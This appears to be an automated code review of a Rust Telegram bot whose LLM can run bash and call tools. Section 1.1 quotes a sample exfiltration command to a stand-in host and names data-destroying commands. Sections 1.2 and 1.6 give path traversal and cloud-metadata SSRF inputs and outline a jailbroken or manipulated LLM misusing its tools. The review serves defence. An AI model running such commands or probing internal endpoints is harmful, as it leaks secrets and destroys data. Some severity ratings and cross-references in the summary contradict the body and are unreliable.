# GlowBot Code Review Report

Generated: 2026-05-12

---

## 1. Security Vulnerabilities

### 1.1 Unbounded Bash Execution (CVSS: High)

**File:** `src/bash.rs:26-34`

The LLM can execute arbitrary bash commands via `bash -c`. The system prompt instructs it to "never run destructive commands" but this is purely advisory — there is **no enforcement**. A malicious or jailbroken LLM could:

- Exfiltrate data (`curl -d @config.yaml https://evil.com`)
- Modify system files (if running as privileged user)
- Use `rm`, `dd`, `mkfs` to destroy data

**Recommendation:** Restrict available binaries (e.g. run in a minimal container), add filesystem namespace isolation, or implement a command-denylist (e.g. reject commands containing `rm\s+-rf`, `/dev/`, etc.). Consider `seccomp` profiles.

---

### 1.2 Path Traversal in `send_media` (CVSS: Medium)

**File:** `src/bot_dispatch_media.rs:127-131`

```rust
let full_path = if std::path::Path::new(file_path).is_absolute() {
    std::path::PathBuf::from(file_path)
} else {
    data_dir.join(file_path)
};
```

Relative paths like `../../etc/passwd` are joined to `data_dir` without canonicalization. A path like `../../../proc/1/environ` from the LLM tool would resolve outside the data directory, allowing exfiltration of arbitrary files via Telegram.

**Recommendation:** Call `.canonicalize()` on the resolved path and verify it is inside `data_dir` (same pattern used correctly in `list_media`).

---

### 1.3 Path Traversal via Symlinks in `list_media` (CVSS: Low)

**File:** `src/bot_dispatch_media.rs:67-115`

The `walk()` function uses `strip_prefix` to display relative paths but does not canonicalize directory entries. Symlinks inside the media directory could point outside it, and the walker would follow them (since `std::fs::read_dir` follows symlinks by default on most platforms).

**Recommendation:** Prepend `std::fs::symlink_metadata` checks and skip symlinks, or canonicalize each path and verify it starts with the base.

---

### 1.4 Global Git Configuration Mutation (CVSS: Low)

**File:** `src/git.rs:15-27`

```rust
let _ = std::process::Command::new("git")
    .args(["config", "--global", "--add", "safe.directory"])
    .arg(repo_path)
    .output();
```

This mutates the **global** git configuration on every process start, appending to `safe.directory` **without deduplication**. Running inside Docker, this modifies the container's `~/.gitconfig` permanently, growing unboundedly if restarted frequently.

**Recommendation:** Use `GIT_CONFIG_GLOBAL` or `HOME` env var override to isolate config, or use `--system`/`--local` where appropriate. At minimum, guard with a check before re-adding.

---

### 1.5 Bearer Token in Logs (CVSS: Low)

**File:** `src/mcp_client.rs:86-91`

```rust
let masked = if key.len() > 8 {
    format!("{}...{}", &key[..4], &key[key.len()-4..])
} else {
    "****".to_string()
};
log::debug!("MCP '{}': using Bearer auth (key={})", self.server.name, masked);
```

While the API key is masked in logs, the `api_key` itself is passed through `reqwest` headers, and the raw response body is logged on error in `invoke_tool_once` (line 59-62 of `mcp_invoke.rs`). If the Bearer token is reflected in error responses, it gets logged.

**Recommendation:** Strip `Authorization` headers before logging error responses.

---

### 1.6 SSRF via MCP Server URLs (CVSS: Medium)

**File:** `src/mcp_invoke.rs:16-68`, `src/bot_dispatch.rs:290-315`

MCP tool invocations send HTTP requests to arbitrary `tool.server_url` values. While these come from the config, the `edit_config` tool allows the LLM to propose MCP server changes. If the LLM is manipulated into adding an MCP server pointing to internal infrastructure (`http://localhost:6379`, `http://169.254.169.254/latest/meta-data/` on AWS), it could access internal services.

**Recommendation:** Add a URL denylist for internal IPs/hosts (localhost, 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, metadata endpoints).

---

## 2. Bugs

### 2.1 `save_config` Auto-Commit is Dead Code

**File:** `src/bot.rs:106-110`

```rust
// self.git_repo
//     .auto_commit("Update configuration via /command")?;
```

The git auto-commit after `save_config` is commented out. Combined with the same issue in `handle_config_callback` (see 2.2), **config changes are never git-committed**, making version history of config changes impossible.

**Recommendation:** Either remove the dead code or re-enable it intentionfully.

---

### 2.2 `handle_config_callback` Cannot Auto-Commit

**File:** `src/bot_dispatch_config.rs:201-202`

```rust
// Note: git_repo is not easily accessible here.
// Auto-commit is best-effort anyway.
```

The `GitRepo` instance is not passed to the callback handler, so accepted config changes lose version tracking. This is inconsistent with `bot_dispatch_image.rs` line 141 where `GitRepo::new` is instantiated for auto-commit of generated images.

**Recommendation:** Pass `git_repo` through to the callback handler like other state, or store it in `BotState`.

---

### 2.3 `ChatId(0)` Silently Created on Parse Failure

**File:** `src/main.rs:182`, `src/bot_heartbeat.rs:91`, `src/bot_dispatch_media.rs:139`, and others

Multiple locations use:

```rust
let chat = ChatId(chat_id.parse().unwrap_or_default());
```

If `chat_id` can't be parsed as `i64`, this silently creates `ChatId(0)`, which is a valid Telegram API call that will either error or send to a nonexistent chat. The error is swallowed, hiding the root cause.

**Recommendation:** Use `let chat = ChatId(chat_id.parse()?)` with proper error handling, or log a warning and return early on parse failure.

---

### 2.4 Lock Poisoning Panics on `unwrap()`

**File:** Throughout codebase (`main.rs`, `bot_pipeline.rs`, `bot_dispatch.rs`, `db.rs`, etc.)

Pattern used extensively:

```rust
stop_signals.lock().unwrap()
```

If any thread panics while holding a `std::sync::Mutex`, the lock becomes **poisoned**, and all subsequent `.lock().unwrap()` calls will panic, taking down the entire bot. While tokio's `Mutex` doesn't poison, `std::sync::Mutex` (used for `stop_signals`, `chat_locks`, `Database.conn`, `McpClient.session_id`) does.

**Recommendation:** Replace `std::sync::Mutex` in hot paths with tokio's Mutex (which doesn't poison), or recover gracefully from poisoning: `.lock().unwrap_or_else(|e| e.into_inner())`.

---

### 2.5 Heartbeat Tasks Ignore `/stop` Signal

**File:** `src/bot_heartbeat.rs:19-24`

`run_heartbeat_task` accepts no `stop_signals` parameter. Once a heartbeat task starts, it cannot be cancelled. The `run_chat_heartbeat` loop checks `has_pending_tasks` between iterations, but individual task processing within `run_heartbeat_task` has no cancellation mechanism.

**Recommendation:** Pass `stop_signals` to `run_heartbeat_task` and check it between tool rounds (same as `process_with_llm_impl`).

---

### 2.6 MCP Session ID Race Condition

**File:** `src/bot_dispatch.rs:290-315`

When `invoke_tool` re-initializes a session (updates `tc.session_id`), the code propagates it to all tools from the same server. But between the re-init and propagation under the `state.lock()`:

1. Tool A fails with SessionNotFound
2. Tool A re-initializes → gets new session ID S1
3. Another concurrent request to the same server's Tool B happens
4. Tool B uses the stale session ID
5. Tool A propagates S1 under the lock

The lock ordering (drop before reinit, acquire after) creates a window where concurrent tool calls see stale state.

**Recommendation:** Do the session re-init atomically under the state lock, or use per-server session mutexes.

---

### 2.7 `format_model_status` and `edit_to_browse` Output Unescaped for MarkdownV2

**File:** `src/bot_models.rs:421-433` and `327-338`

Model IDs containing `(`, `)`, `-`, `.`, `!`, `~` will break Telegram's MarkdownV2 parser. The `format_model_status` function wraps model IDs in backticks but doesn't escape the surrounding text. `edit_to_browse` uses `escaped_label` for the category header correctly, but individual model name buttons (which are inline keyboard callbacks, not Markdown) are fine.

In `edit_to_browse` line 337-340:
```rust
let escaped_label = crate::escape_v2_safe(category_label);
let text = format!("*{}* \\({} models\\)", escaped_label, total);
```
This should be fine as `escaped_label` is escaped via `escape_v2_safe`.

But in `format_model_status` (line 421-432):
```rust
format!(
    "🎯 *Current model:* `{}` \\(override\\)\n📌 Config default: `{}`\n\nBrowse models:",
    current, config_default
)
```
The `current` and `config_default` model IDs are inside backticks — backticks in MarkdownV2 prevent parsing, so special chars inside them should be safe. This is actually correct behavior.

**Verdict:** Not a bug — backticks in MarkdownV2 prevent parsing of content inside.

---

### 2.8 `edit_to_provider_list` Provider Name Label Truncation at Byte Boundary

**File:** `src/bot_models.rs:254-257`

```rust
let label = if provider.len() > 20 {
    format!("{}…", &provider[..19])
} else {
    provider.clone()
};
```

This slices at a byte index, not a character boundary. If a provider name contains multi-byte UTF-8 characters (e.g., emoji, CJK), this will panic.

**Recommendation:** Use `.chars().take(19).collect::<String>()`.

---

## 3. Code Smells

### 3.1 `bot_models.rs` Exceeds 450-Line Hard Limit

**File:** `src/bot_models.rs` — ~470 lines

The AGENTS.md sets a hard upper limit of 450 lines. `bot_models.rs` is at ~470 lines, just over.

**Recommendation:** Extract pagination logic (`edit_to_browse`, `edit_to_provider_list`) into a separate submodule `bot_models_pagination.rs`.

---

### 3.2 Duplicated `short_id()` Function

**File:** `src/bot_dispatch_config.rs:14-20` and `src/bot_dispatch_model.rs:11-17`

Identical implementation generates a hex timestamp ID.

**Recommendation:** Move to a shared utility module or `bot_dispatch.rs`.

---

### 3.3 Duplicated `base64_encode()` Function

**File:** `src/media.rs:82-85` (as private fn) and `src/bot_dispatch_image.rs:216-219` (as private fn)

**Recommendation:** Make `base64_encode` in `media.rs` `pub(crate)` and reuse it.

---

### 3.4 `bot_pipeline.rs` Has Too Many Responsibilities (~430 lines)

**File:** `src/bot_pipeline.rs`

This single file handles: typing indicator management, stop signal setup, memory creation, conversation history loading, orphan stripping, media ingestion (native + fallback), LLM pipeline (tool loop), turn storage, and background embedding. Each of these is a separate concern.

**Recommendation:** Split into:
- `bot_pipeline_media.rs` — `build_user_message_full`, `build_native_message`, `build_fallback_message`, `call_image_fallback`, `call_audio_fallback`, `build_text_metadata_message`, `media_metadata_text`
- `bot_pipeline_core.rs` — `process_with_llm_impl`, `TypingGuard`
- Keep embedding helpers where they are or move to `bot_pipeline_embed.rs`

---

### 3.5 Extreme Tool Loop Limit

**File:** `src/bot_pipeline.rs:119`

```rust
let max_tool_rounds = 64;
```

A 64-round tool loop could result in tens of minutes of processing. The `/stop` signal is checked each round, but if no one sends `/stop`, the user experiences extreme latency.

**Recommendation:** Reduce to 10-15 rounds (matching the heartbeat task limit), or add an overall timeout.

---

### 3.6 `dispatch_tool` Function Is Too Large

**File:** `src/bot_dispatch.rs:85-380` — ~295 lines

The match statement dispatches 22+ tools in a single function, making it hard to navigate and test individually.

**Recommendation:** Each tool group should be a free function (some already are via submodules). Extract RAG/conversation search into `bot_dispatch_search.rs`.

---

### 3.7 Implicit Default on Malformed Tool Arguments

**File:** `src/bot_dispatch.rs:60-61`

```rust
let args: serde_json::Value =
    serde_json::from_str(&tc.function.arguments).unwrap_or_default();
```

If the LLM produces malformed JSON for tool arguments, the code silently substitutes `Value::Null`. This means a typo in JSON arguments won't produce an error; instead the tool gets empty args and may behave unexpectedly.

**Recommendation:** Log a warning when JSON parsing fails, and return an error to the LLM so it can correct itself.

---

### 3.8 Inconsistent `unwrap_or_default` vs `?` Patterns

Throughout the codebase, some errors are silently converted to defaults (via `unwrap_or_default()`) while others are propagated (via `?`). There's no consistent policy.

Examples of potentially dangerous `unwrap_or_default()`:
- `serde_yaml::from_str(&data).unwrap_or_default()` in `tasks.rs:25`
- `serde_yaml::from_str(&data).unwrap_or_default()` in `reminders.rs:46`

These silently return empty lists on YAML parse errors, effectively losing all stored tasks/reminders.

---

## 4. Footguns

### 4.1 `drop(guard)` Pattern in Heartbeat Scheduler

**File:** `src/main.rs:276-279`

```rust
guard.insert(chat_id.clone());
drop(guard);
```

The `guard` is explicitly dropped before the `tokio::spawn` block to avoid holding the `active` set lock across an await point. If someone refactors to remove the `drop()` call, the lock would be held across `.await`, potentially causing deadlocks.

**Recommendation:** Add a comment explaining why `drop()` is necessary, and consider using a scope block instead:

```rust
{
    let mut guard = active.lock().await;
    guard.insert(chat_id.clone());
} // guard dropped here
```

---

### 4.2 `#[path]` Attribute Makes Navigation Harder

**File:** Throughout codebase

All submodules use `#[path = "..."]` to keep files flat in `src/`. While documented in AGENTS.md as intentional, this is not standard Rust convention and can confuse contributors. Editor tooling may not follow these paths correctly.

**Recommendation:** Either accept this as a project convention or migrate to standard `mod.rs`/directory structure.

---

### 4.3 `handle_message` Uses `ChatId` Parse Twice

**File:** `src/main.rs:181-182`

```rust
let chat = ChatId(chat_id.parse().unwrap_or_default());
// ... later in send_message:
// ChatId(cid.parse().unwrap_or_default())
```

The chat ID string is parsed to i64 at least twice per message — once in `handle_message` for the lock key, and once in `send_message`. If the parse fails in one place but not the other, inconsistencies arise.

---

### 4.4 No Overall Timeout on Message Processing

**File:** `src/main.rs` `handle_message`

A single message processing pipeline has **no timeout**. If the LLM takes 64 rounds × 30s bash timeout each = 32 minutes, the per-chat lock holds for that entire duration, blocking all other messages for that chat.

**Recommendation:** Add a `tokio::time::timeout(5 * 60)` around the entire `process_message_impl` call.

---

### 4.5 `conversation.include_reasoning` Persists Across Rounds but Is Read Once

**File:** `src/bot_pipeline.rs:64`

```rust
let (history, include_reasoning) = {
    let s = state.lock().await;
    let include = s.config.conversation.include_reasoning;
    // ...
    (hist, include)
};
```

`include_reasoning` is read at the start and used for the entire tool loop. If config changes via `edit_config` mid-loop to enable reasoning, the loop won't pick it up. While this is acceptable for consistency, it could be surprising.

---

## 5. Other Issues

### 5.1 `bot_send.rs` Uses `ParseMode::MarkdownV2` But Fallback to Plain Text Discards Formatting

**File:** `src/bot_send.rs:35-40`

```rust
if let Err(e) = result {
    log::warn!("MarkdownV2 parse failed, sending as plain text: {}", e);
    let _ = bot.send_message(chat_id, &msg).await;
}
```

On MarkdownV2 parse failure, the raw unescaped text is sent. The user sees `*Part 1/2*` instead of rendered bold. This is better than not sending at all, but the fallback should strip Markdown syntax for readability.

---

### 5.2 Schema `.sql` Files Are Not Loaded in `init_direct` Fallback

**File:** `src/db_migrations.rs:101-131`

`init_direct` hardcodes the DDL, duplicating the schema defined in `schema/*.sql`. If the schema files change but `init_direct` isn't updated, a mismatch occurs when `sqldiff` is unavailable (the fallback path).

**Recommendation:** Have `init_direct` read and concatenate the `.sql` files at compile time (via `include_str!`) to keep them in sync.

---

### 5.3 `GitRepo::new` Has Global Side Effects on Every Construction

**File:** `src/git.rs:15-27`

Every call to `GitRepo::new` runs 3 `git config --global` commands. This is called in `new_with_llm` (once per process) and in `tool_generate_image` in `bot_dispatch_image.rs:141` (once per image generation). The latter is extra unnecessary work since the config was already set at startup.

**Recommendation:** Lazy-initialize git config once (e.g., with `OnceCell` or a `static`).

---

### 5.4 `tool_calls.log` Grows Indefinitely

**File:** `src/bot_dispatch.rs:18-40`

Every tool call is appended to `tool_calls.log`. There is no log rotation, size limit, or cleanup. On a busy bot, this file will grow unboundedly.

**Recommendation:** Add log rotation (e.g., truncate at startup, or rotate when >10MB).

---

### 5.5 Reminder Due Check Uses `parse_from_rfc3339` on Every Heartbeat Scan

**File:** `src/reminders.rs:100-110`

The `due()` method parses every reminder's timestamp on every heartbeat cycle (every 60s). If a chat has hundreds of past-due reminders (edge case), this does redundant parsing.

**Recommendation:** Cache parsed timestamps or clean up old reminders.

---

### 5.6 Embedding Backfill Prints to stdout

**File:** `src/bot.rs:186-187`

```rust
println!("Embedding backfill: {}/{} ({}%) done", done, total, pct);
```

Mixing `println!` with `log::info!` for the same messages. In a production container, `println!` output goes to stdout alongside structured logs.

**Recommendation:** Use `log::info!` consistently and remove `println!`.

---

### 5.7 Test for `format_model_status` Is Missing

**File:** `src/bot_models.rs`

While `detail_cb` and `select_cb` have tests, `format_model_status` (an async function returning formatted Markdown) has no tests. Its output goes directly into Telegram API calls, so formatting errors surface at runtime.

---

## 6. Summary

| Severity | Count | Key Issues |
|----------|-------|------------|
| **High** | 2 | Unbounded bash execution, SSRF via MCP |
| **Medium** | 4 | Path traversal (send_media), lock poisoning panics, ChatId(0) silent failures, session ID race |
| **Low** | 4 | Path traversal (list_media symlinks), git config mutation, token in logs, silent YAML parse failures |
| **Code Smell** | 8 | File too large, duplicated code, mixed concerns, extreme loop limit, missing error handling |

The most impactful fixes would be:
1. Add path traversal protection to `send_media` (2.2)
2. Add URL allowlist/denylist for MCP server calls (1.6)
3. Fix `ChatId(0)` silent fallback pattern across the codebase (2.3)
4. Replace `std::sync::Mutex` with non-poisoning alternatives in hot paths (2.4)
5. Add `/stop` checking to heartbeat tasks (2.5)
6. Reduce `max_tool_rounds` from 64 to a reasonable value (3.5)
